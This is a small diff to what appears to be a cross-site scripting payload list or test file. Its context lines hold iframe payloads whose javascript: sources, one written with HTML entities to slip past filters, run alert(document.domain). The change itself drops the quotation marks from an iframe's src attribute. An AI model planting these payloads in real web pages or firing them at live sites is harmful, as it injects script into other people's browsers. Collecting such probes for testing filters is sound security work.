@@ -21,7 +21,7 @@
 <iframe src=javascript&colon;alert&lpar;document&period;domain&rpar;>
 <h1><IFRAME SRC="javascript:alert(document.domain);"></IFRAME>">1723</h1>
 
-<iframe src="http://google.com/"></iframe><marquee><h1>nil2</h1></marquee>
+<iframe src=http://google.com/></iframe><marquee><h1>nil2</h1></marquee>
 
 
 
